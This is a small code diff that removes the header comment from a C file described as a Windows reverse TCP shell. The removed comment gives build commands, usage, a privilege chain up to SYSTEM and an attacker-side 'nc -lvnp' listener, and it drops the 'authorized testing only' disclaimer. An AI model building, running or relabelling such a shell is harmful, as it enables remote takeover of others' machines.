@@ -1,19 +1,3 @@
-/*
- *  Reverse TCP Shell — Windows (C / Winsock2)
- *  For AUTHORIZED penetration testing and security research ONLY.
- *
- *  BUILD:  windres manifest.rc -o manifest.o
- *          gcc reverse_shell_system.c manifest.o -o reverse_shell_system.exe -lws2_32 -ladvapi32 -lshell32 -mwindows
- *
- *  USAGE:  reverse_shell_system.exe <HOST> <PORT>
- *
- *  PRIVILEGE CHAIN:
- *    User (medium) → Admin (high) → NT AUTHORITY\SYSTEM
- *
- *  LISTENER (attacker side):
- *      nc -lvnp <PORT>
- */
-
 #define WIN32_LEAN_AND_MEAN
 
 #include <stdio.h>
